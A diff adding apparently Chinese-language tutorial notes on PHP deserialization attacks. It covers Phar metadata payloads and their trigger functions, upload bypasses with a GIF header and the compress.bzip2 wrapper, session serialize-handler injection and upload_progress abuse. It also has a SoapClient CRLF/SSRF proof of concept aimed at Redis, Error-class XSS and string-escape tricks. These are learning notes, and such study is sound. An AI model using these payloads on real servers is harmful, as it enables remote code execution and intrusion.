@@ -541,6 +541,393 @@ Phar的本质是一个压缩文件，反序列化攻击的核心是其中`序列
 使用PHP代码即可生成Phar，相当方便，样例如下：
 
 ```php
+<?php
+class Test
+{
+}
 
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+
+$obj = new Test();
+$obj->name = 'test';
+$phar->setMetadata($obj);
+$phar->addFromString("flag.php", "flag");
+
+$phar->stopBuffering();
 ```
 
+> 注意：需要将phar.readOnly设为Off
+
+生成的Phar文件如下：
+
+![image-20220516140952026](./image-20220516140952026.png)
+
+可以看到，这里的`Test`对象设置进去时时经过了序列化的。
+
+##### Phar读取时反序列化meta-data受影响函数
+
+Phar在读取`meta-data`必然会存在一个反序列化过程，用于还原对象，那么这里就容易使用反序列化攻击造成RCE。
+
+受影响的函数列表如下：
+
+|       fileatime       |     filectime     |   file_exists    | file_get_contents  |
+| :-------------------: | :---------------: | :--------------: | :----------------: |
+| **file_put_contents** |     **file**      |  **filegroup**   |     **fopen**      |
+|     **fileinode**     |   **filemtime**   |  **fileowner**   |   **fileperms**    |
+|      **is_dir**       | **is_executable** |   **is_file**    |    **is_link**     |
+|    **is_readable**    |  **is_writable**  | **is_writeable** | **parse_ini_file** |
+|       **copy**        |    **unlink**     |     **stat**     |    **readfile**    |
+
+相关的一些具体分析可以见[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - zsx's Blog (zsxsoft.com)](https://blog.zsxsoft.com/post/38)，该文章对于PHP源代码进行了分析，分析了为什么能造成RCE。
+
+上面的表格是没有整理完成的，这里的话，还要下面的方式都可以利用：
+
+* EXIF
+
+  * exif_thumbnail
+  * exif_imagetype
+
+* gd
+
+  * imageloadfont
+  * imagecreatefrom***
+
+* hash
+
+  * hash_hmac_file
+  * hash_file
+  * hash_update_file
+  * md5_file
+  * sha1_file
+
+* file/url
+
+  * get_meta_tags
+  * get_headers
+
+* standard
+
+  * getimagesize
+  * getimagesizefromstring
+
+* zip
+
+  ```php
+  $zip = new ZipArchive();
+  $res = $zip->open('test.zip');
+  $zip->extractTo('phar://test.phar/test');
+  ```
+
+* Bzip / Gzip
+
+  ```php
+  $z = 'compress.bzip2://phar://test.phar/test';
+  $z = 'compress.zlib://phar://test.phar/test'
+  ```
+
+* Postgres
+
+  ```php
+  <?php
+  $pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
+  @$pdo->pgsqlCopyFromFile('aa', 'phar://test.phar/aa');
+  ```
+
+  > 如果使用pgsqlCopyToFile或者pg_trace，需要开启对应的phar写功能
+
+* MySQL
+
+  ```php
+  <?php
+  class A {
+      public $s = '';
+      public function __wakeup () {
+          system($this->s);
+      }
+  }
+  $m = mysqli_init();
+  mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);
+  $s = mysqli_real_connect($m, 'localhost', 'root', '123456', 'easyweb', 3306);
+  $p = mysqli_query($m, 'LOAD DATA LOCAL INFILE \'phar://test.phar/test\' INTO TABLE a  LINES TERMINATED BY \'\r\n\'  IGNORE 1 LINES;');
+  ```
+
+  配置`mysqld`为：
+
+  ```ini
+  [mysqld]
+  local-infile=1
+  secure_file_priv=""
+  ```
+
+##### 简单的Phar反序列化
+
+假设现在有一个任意文件上传漏洞，并且有一个页面的代码如下：
+
+```php
+<?php
+
+class Test
+{
+    public $data = 'echo "hello world!"';
+    function __wakeup()
+    {
+        eval($this->data);
+    }
+}
+if ($_GET['file']) {
+    echo file_exists($_GET['file']);
+}
+```
+
+那么这样如何利用呢？
+
+结合前面的POP利用，应该不难得出：
+
+```php
+<?php
+class Test
+{
+}
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$o = new Test();
+$o->data = "echo 'RCE';";
+$phar->setMetadata($o);
+$phar->addFromString("test.txt", "test");
+$phar->stopBuffering();
+```
+
+上传Phar，并且传入`file=phar://phar.phar`，这就可以完成一次反序列利用。
+
+假如只有图片上传接口时，这个时候我们可以自己在文件中添加对应的头部，这不会影响正常的Phar解析。
+
+例如：
+
+```php
+$phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
+```
+
+那如果，现在我们传入的file不允许以phar开头呢？
+
+当然也是有办法的：`file=compress.bzip2://phar://phar.phar`
+
+#### Session反序列化
+
+在开始前，需要简单介绍一下PHP的Session机制。
+
+##### PHP的Session机制
+
+在Web Application中，会话控制或者说会话保持是一个非常重要的操作，也是授权体系的重要需求。
+
+PHP使用`Session_start`创建一个唯一的`Session ID`，并且自动通过HTTP响应头设置其对应的Cookie；创建是在用户请求中的Cookie没有对应的`Session ID`才会创建的。
+
+> 在上面的机制下，用户可以自行设置对应的Session ID。
+
+在Session中，有几个重要的参数：
+
+|              参数               |                        含义                        |
+| :-----------------------------: | :------------------------------------------------: |
+|      session.save_handler       |            session保存形式、默认为files            |
+|        session.save_path        |                  session保存路径                   |
+|    session.serialize_handler    |       session序列化存储所用处理器，默认为PHP       |
+| session.upload_progress.cleanup | 一旦读取了所有POST数据，立即清除进度信息。默认开启 |
+| session.upload_progress.enabled |    将上传文件的进度信息存在session中。默认开启     |
+
+PHP对于session的处理有不同的Handler，如下：
+
+|    Handler    |                   存储格式                   |
+| :-----------: | :------------------------------------------: |
+|      php      |           键名+竖线+serialize数据            |
+|  php_binary   | 键名的长度对应的ASCII字符+键名+serialize数据 |
+| php_serialize |                serialize数据                 |
+
+三种handler对应如下代码：
+
+```php
+session_start();
+$_SESSION['name'] = 'evalexp';
+```
+
+其对应的Session文件内容：
+
+|    Handler    |             Session             |
+| :-----------: | :-----------------------------: |
+|      php      |      name\|s:7:"evalexp";       |
+|  php_binary   |       names:7:"evalexp";        |
+| php_serialize | a:1:{s:4:"name";s:7:"evalexp";} |
+
+##### Session反序列化的漏洞原因
+
+PHP本身实现的Session是没有问题的，问题出在了开发者使用Session上。如果开发者在存储Session数据和读取Session数据时所使用的Handler不一致，就将导致无法正确地反序列化，从而导致被反序列化攻击。
+
+看一个简单的案例：
+
+```php
+$_SESSION['hello'] = '|O:8:"stdClass":0:{}';
+```
+
+当使用`php_serialize`进行序列化时，得到的Session如下：
+
+```php
+a:1:{s:5:"hello";s:20:"|O:8:"stdClass":0:{}";}
+```
+
+如果这个数据使用的Handler为`php`时，注意`php handler`是以`|`分割的，这就导致了不正确的反序列化：
+
+```php
+$_SESSION['a:1:{s:5:"hello";s:20:"'] = object(stdClass){}
+```
+
+实际利用的话，主要得看被攻击端的设置：
+
+* **session.auto_start**
+
+当这一个选项为On时，开发者应该在Session处理时，在开头加入这样的代码：
+
+```php
+if(ini_get('session.auto_start')) {
+    session_destroy();
+}
+```
+
+然后再去自己处理Session，如果没有对应的处理，如下面简单的样例：
+
+```php
+// index.php
+<?php
+if (ini_get('session.auto_start')) {
+    session_destroy();
+}
+
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+
+if (isset($_GET['test'])) {
+    $_SESSION['test'] = $_GET['test'];
+}
+```
+
+```php
+// test.php
+<?php
+var_dump($_SESSION);
+```
+
+此时我们向`index.php`传入：`test=|O:8:%22stdClass%22:0:{}`，然后再访问`test.php`。
+
+此时得到的结果是这样的：`array(1) { ["a:1:{s:4:"test";s:20:""]=> object(stdClass)#1 (0) { } }`
+
+当上述的设置为Off时，实际上就需要有两个页面指定的处理器不相同时才能完成反序列化攻击。
+
+##### session.upload_progress利用
+
+PHP 5.4以上，PHP为了提供文件上传的基础信息，会在Session文件里存储文件上传的进度。
+
+默认的选项有如下：
+
+* session.upload_progress.enabled = on  // 启用上传进度信息记录
+* session.upload_progress.cleanup = on  // 文件上传结束后，php立即清除session内容
+* session.upload_progress.prefix = "upload_progress_"
+* session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
+* session.upload_progress.freq = "1%"
+* session.upload_progress.min_freq = "1"
+
+当Name为PHP_SESSION_UPLOAD_PROGRESS(实际上即Name与session.upload_progress.name同名即可)的字段出现在表单中时，PHP就会报告上传进度，并且这个的值时可控的。当PHP检测到字段时，会向Session文件写入一个键值对，其键为prefix+name，其值为我们的值。
+
+所以这就让我们能够向服务器写入一些恶意的字符串，自然可以包含一些恶意的序列化数据，让其反序列化时造成RCE。
+
+> 这里自然也可以通过LFI进行RCE。
+
+#### PHP原生反序列化利用
+
+##### SoapClient
+
+PHP的`SoapClient`类可以创建Soap数据报文，与WSDL接口进行交互，其定义如下：
+
+```php
+public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )
+```
+
+其类摘要可见[PHP: SoapClient - Manual](https://www.php.net/manual/zh/class.soapclient.php)。
+
+调用其`__call`方法时，可以发送HTTP或者HTTPS请求，从而造成SSRF。
+
+其POC如下：
+
+```php
+<?php
+$target = 'http://127.0.0.1:12345';
+$post_string = 'a=b&flag=aaa';
+$headers = array(
+    'X-Forwarded-For: 127.0.0.1',
+    'Cookie: xxxx=1234'
+);
+$b = new SoapClient(null, array('location' => $target, 'user_agent' => 'wupco^^Content-Type: application/x-www-form-urlencoded^^' . join('^^', $headers) . '^^Content-Length: ' . (string)strlen($post_string) . '^^^^' . $post_string, 'uri'      => "aaab"));
+
+$aaa = serialize($b);
+$aaa = str_replace('^^', '%0d%0a', $aaa);
+$aaa = str_replace('&', '%26', $aaa);
+
+unserialize(urldecode($aaa))->a();
+```
+
+可以看到NC接受到的数据如下：
+
+![image-20220516164609221](./image-20220516164609221.png)
+
+这一个的SSRF只能使用HTTP协议，因此在实战中可能用处不大，但是如果HTTP头部存在CRLF漏洞的话，可以利用该漏洞去访问Redis从而GetShell。
+
+如下面的代码：
+
+```php
+$poc = "CONFIG SET dir /root/";
+$target = 'http://127.0.0.1:12345';
+
+$soap = new SoapClient(null, array('location' => $target, 'uri' => 'hello^^' . $poc . '^^hello'));
+
+$ser_soap = serialize($soap);
+$ser_soap = str_replace('^^', "\n\r", $ser_soap);
+
+unserialize($ser_soap)->hello();
+```
+
+可以得到：
+
+![image-20220516165907038](./image-20220516165907038.png)
+
+##### Error/Exception
+
+Error是一个内置类，在PHP7环境下可能导致XSS，因为有一个内置的`__toString`方法
+
+Exception类的原理与Error类一样，但是在PHP5中适用。
+
+例如Error类的利用：
+
+```php
+<?php
+$error = new Error("<script>alert('XSS');</script>");
+$data = serialize($error);
+
+echo unserialize($data);
+```
+
+这就引发了XSS注入。
+
+#### 反序列化字符逃逸
+
+在前面的总结里应该都看到过PHP序列化后的字符串，都会以一个Int标注属性的长度，这为解析提供了方便。
+
+字符逃逸的本质实质上和注入差不多，都是通过闭合，让字符逃逸，分为两种情况，分别为字符变多、字符变少（应用于对输入有过滤或者处理的情况）。
+
+##### 字符增多
+
+字符增多就是后端对我们输入的序列化后的字符进行替换称为长度更长的字符。
+
+这个的处理相对简单，修改对应的长度即可，比如说将p替换为了WW，那么就将`s:1:"p"`换成`s:2:"p"`，换完之后长度能够正常反序列化即可。
+
+##### 字符减少
+
+与上面相反，服务端替换为了更短的字符串，这就为我们提供了遍历，只需要利用这一特性往里面加入被替换的字符串，就可以为我们留出自己的恶意串的位置。
